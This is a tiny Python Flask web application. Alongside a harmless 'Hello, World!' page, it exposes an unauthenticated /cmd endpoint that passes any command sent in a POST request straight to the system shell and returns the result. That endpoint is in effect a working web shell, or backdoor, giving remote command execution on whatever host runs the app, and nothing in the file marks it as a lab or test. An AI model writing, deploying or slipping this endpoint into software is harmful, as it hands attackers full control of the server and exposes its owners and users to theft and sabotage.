import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"

@app.route("/cmd", methods=['POST'])
def cmd():
    data = request.get_json()
    try:
        return subprocess.check_output([data['cmd']], shell=True)
    except subprocess.CalledProcessError as e:
        return e.output